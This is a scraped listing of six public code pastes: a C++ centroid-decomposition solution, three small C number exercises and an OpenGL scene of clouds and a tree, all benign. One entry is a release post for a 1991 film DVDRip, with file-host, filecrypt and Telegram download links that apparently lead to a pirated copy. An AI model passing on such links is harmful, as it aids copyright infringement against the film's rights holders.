sLzjTb64,Untitled,ProgMe,C++,Sunday 19th of November 2023 03:48:56 AM CDT,"#include <bits/extc++.h>
#define int int64_t

using namespace std;
using namespace __gnu_pbds;

const int N = 1e5 + 1;
const int mod = 1e9 + 7;

array<bool, N> used;
array<int, N> sz;
array<vector<pair<int, int>>, N> g;

int recalcSizes(int v, int p = -1) {
    sz[v] = 1;
    for (auto [u, w] : g[v]) {
        if (u != p && !used[u]) {
            sz[v] += recalcSizes(u, v);
        }
    }
    return sz[v];
}

int centroid(int n, int v, int p = -1) {
    for (auto [u, w] : g[v]) {
        if (u != p && !used[u] && sz[u] > n / 2) {
            return centroid(n, u, v);
        }
    }
    return v;
}

void dfs(int v, int p, int& ans, int &sum, int prev_sum, int& cnt, int prev_cnt, int depth) {
    cnt++;
    cnt %= mod;

    sum += depth;
    sum %= mod;

    ans += prev_cnt * depth + prev_sum;
    ans %= mod;

    for (auto [u, w] : g[v]) {
        if (u != p && !used[u]) {
            dfs(u, v, ans, sum, prev_sum, cnt, prev_cnt, depth + w);
        }
    }
}

int centroidDecomposition(int v) {
    recalcSizes(v);

    int ans = 0, sum = 0, cnt = 0;
    for (auto [u, w] : g[v]) {
        if (!used[u]) {
            dfs(u, v, ans, sum, sum, cnt, cnt, w);
        }
    }
    ans += sum;
    ans %= mod;

    used[v] = true;
    for (auto [u, w] : g[v]) {
        if (!used[u]) {
            ans += centroidDecomposition(centroid(sz[u], u));
            ans %= mod;
        }
    }

    return ans;
}

int32_t main() {
    ios::sync_with_stdio(false);
    cin.tie(nullptr);

    int n;
    cin >> n;

    for (int i = 0; i < n - 1; i++) {
        int v, u;
        cin >> v >> u;
        v--, u--;

        int w;
        cin >> w;

        g[v].emplace_back(u, w);
        g[u].emplace_back(v, w);
    }

    recalcSizes(0);
    cout << centroidDecomposition(centroid(n, 0));
}
"
icn0JSXy,Untitled,Josif_tepe,C,Sunday 19th of November 2023 03:38:31 AM CDT,"#include <stdio.h>


int main (int argc, const char * argv[]) {
   
    int a, b;
    scanf(""%d%d"", &a, &b);
    
    for(int i = a; i <= b; i++) {
        int prevrten = 0;
        for(int x = i; x > 0; x /= 10) {
            int cifra = x % 10;
            prevrten = (prevrten * 10) + cifra;
        }
        
        int zbir = 0;
        for(int j = 1; j < prevrten; j++) {
            if(prevrten % j == 0) {
                zbir += j;
            }
        }
        if(prevrten == zbir) {
            printf(""%d "", i);
        }
    }
    
    return 0;
}

"
8NSFwr8h,Untitled,Josif_tepe,C,Sunday 19th of November 2023 03:32:46 AM CDT,"#include <stdio.h>


int main (int argc, const char * argv[]) {
    
    int a, b;
    scanf(""%d%d"", &a, &b);
    
    for(int i = a; i <= b; i++) {
        int prevrten = 0;
        
        for(int x = i; x > 0; x /= 10) {
            int cifra = x % 10;
            prevrten = (prevrten * 10) + cifra;
        }
        int kolku_deliteli = 0;
        for(int j = 1; j <= prevrten; j++) {
            if(prevrten % j == 0) {
                kolku_deliteli++;
            }
        }
        if(kolku_deliteli == 2) {
            printf(""%d "", i);
        }
    }
    return 0;
}

"
ufHAMD39,Carne.1991.Fre.DVDRip.mpeg.mp3.Subs-bp,bpmircea,BrainFuck,Sunday 19th of November 2023 03:31:09 AM CDT,"Carne (Carne) (Gaspar Noé, 1991)
aka
Carne.1991.Fre.DVDRip.mpeg.mp3.Subs-bp
https://www.imdb.com/title/tt0218871/
MediaInfo: https://t1p.de/vpheb

https://files.fm/f/4u7js3z5ue
https://filecrypt.cc/Container/E5E88A7364.html
https://t.me/c/1355332637/1515

Audio tracks: fr | Subtitles: en es pt ro ru"
npaRjvZG,Untitled,Josif_tepe,C,Sunday 19th of November 2023 03:28:42 AM CDT,"#include <stdio.h>


int main (int argc, const char * argv[]) {
    
    int a, b;
    scanf(""%d%d"", &a, &b);
    
    for(int i = a; i <= b; i++) {
        int palindrom = 0;
        int proizvod = 1;
        
        for(int x = i; x > 0; x /= 10) {
            int cifra = x % 10;
            palindrom = (palindrom * 10) + cifra;
            proizvod *= cifra;
        }
        
        if(palindrom == i) {
            int kolku_deliteli = 0;
            
            for(int j = 1; j <= proizvod; j++) {
                if(proizvod % j == 0) {
                    kolku_deliteli++;
                }
            }
            
            if(kolku_deliteli == 2) {
                printf(""%d "", i);
            }
        }
        
    }
    return 0;
}

"
XatYmqpP,Untitled,NAHID_GTC,C++,Sunday 19th of November 2023 03:27:57 AM CDT,"#include <GL/gl.h>
#include<stdio.h>
#include<math.h>
#include <GL/glut.h>

void init(void)
{
    glClearColor(0.0, 0.9, 0.9, 0.0);
    glMatrixMode(GL_PROJECTION);
    gluOrtho2D(0, 1000, 0, 900);
}

void circle(GLfloat rx, GLfloat ry, GLfloat cx, GLfloat cy)
{
    glBegin(GL_POLYGON);
    glVertex2f(cx, cy);
    for (int i = 0; i <= 360; i++)
    {
        float angle = i * 3.1416 / 180;
        float x = rx * cos(angle);
        float y = ry * sin(angle);
        glVertex2f((x + cx), (y + cy));
    }
    glEnd();
}

float shift = 0; // a variable used to move the boat right and left


float bx = 10;

void clouds()
{
    glPushMatrix();
    glTranslatef(bx, 0, 0);
    // 1st cloud
    glColor3ub(255, 255, 255);

    // first cloud
    circle(50, 50, 300, 700);
    circle(50, 50, 350, 700);
    circle(50, 50, 400, 700);
    circle(50, 50, 450, 700);

    circle(50, 50, 325, 725);
    circle(50, 50, 350, 725);
    circle(50, 50, 400, 725);
    circle(50, 50, 425, 725);

    circle(50, 50, 345, 750);
    circle(50, 50, 400, 750);
    circle(50, 50, 415, 750);

    // seond cloud
    circle(50, 50, 600, 720);
    circle(50, 50, 650, 720);
    circle(50, 50, 700, 720);
    circle(50, 50, 750, 720);

    circle(50, 50, 625, 745);
    circle(50, 50, 650, 745);
    circle(50, 50, 700, 745);
    circle(50, 50, 725, 745);

    circle(50, 50, 645, 770);
    circle(50, 50, 700, 770);
    circle(50, 50, 715, 770);

    // tree
    glColor3f(194.0/255.0, 114.0/255.0, 17.0/255.0);
    glBegin(GL_QUADS);
        glVertex2d(800, 300);
        glVertex2d(800, 600);
        glVertex2d(850, 600);
        glVertex2d(850, 300);
    glEnd();

    glColor3ub(0,128,0);

    circle(50, 50, 750, 600);
    circle(50, 50, 800, 600);
    circle(50, 50, 850, 600);
    circle(50, 50, 900, 600);

    circle(50, 50, 775, 625);
    circle(50, 50, 800, 625);
    circle(50, 50, 850, 625);
    circle(50, 50, 875, 625);

    circle(50, 50, 795, 650);
    circle(50, 50, 850, 650);
    circle(50, 50, 855, 650);
   /* glPopMatrix();
    bx += .05;
    if (bx > 0)
        bx = -500;
    glutPostRedisplay();*/

}

void display(void)
{
    glClear(GL_COLOR_BUFFER_BIT);

    // green field
    glColor3f(0,128,0);
    glBegin(GL_QUADS);
        glVertex2d(0, 0);
        glVertex2d(0, 300);
        glVertex2d(1000, 300);
        glVertex2d(1000, 0);
    glEnd();

    //sun design
    glColor3f(255, 215, 0);

    circle(50, 50, 100, 700);

    // clouds design
    clouds();


    glFlush();
    glutSwapBuffers();
}


int main(int argc, char** argv)
{
    glutInit(&argc, argv);
    glutInitDisplayMode(GLUT_SINGLE | GLUT_RGB);
    glutInitWindowSize(1000, 900);
    glutInitWindowPosition(100, 100);
    glutCreateWindow(""A Moving Boat"");
    init();
    glutDisplayFunc(display);
    glutMainLoop();
    return 0;
}
"
